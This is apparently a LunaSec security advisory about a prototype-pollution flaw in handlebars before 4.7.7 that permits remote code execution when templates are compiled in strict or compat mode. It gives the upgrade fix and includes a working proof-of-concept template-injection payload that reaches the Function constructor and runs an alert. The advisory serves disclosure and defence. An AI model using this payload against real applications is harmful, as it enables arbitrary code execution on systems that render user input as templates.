<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

## What is it?

A [prototype pollution](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications)
vulnerability was found in the `handlebars` library, and it has been [reported](https://github.com/handlebars-lang/handlebars.js/issues/1736) that remote code execution (RCE)
is possible with certain conditions.

<!--truncate-->

## Who is impacted?

Anyone who is using the `handlebars` library (`< 4.7.7`) to take user input as a template and format it. The vulnerability

would allow an attacker to gain RCE if the compiler flags `compat` or `strict` are used.

## Permanent Mitigation

Upgrade your `handlebars` version to `>= 4.7.7`.

## How to exploit it

```html
<script src="https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js"></script>
<script>
// compile the template
var s = `
{{#with (__lookupGetter__ "__proto__")}}
    {{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}}
        {{#with ../constructor.prototype}}
            {{../../constructor.defineProperty . "hasOwnProperty" ..}}
        {{/with}}
    {{/with}}
{{/with}}
{{#with "constructor"}}
    {{#with split}}
        {{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}}
        {{#with .}}
            {{#with (concat (lookup join (slice 0 1)))}}
                {{#each (slice 2 3)}}
                    {{#with (apply 0 ../..)}} {{.}} {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}`;
var template = Handlebars.compile(s, { strict: true });
// execute the compiled template and print the output to the console
console.log(template({}));
</script>
```

The above POC demonstrates how to exploit the vulnerability if `strict` mode is used when compiling the template. It is also
possible to exploit this when `compat` mode is used.

### Links
- https://github.com/advisories/GHSA-765h-qjxv-5f44
- https://github.com/handlebars-lang/handlebars.js/issues/1736
- http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
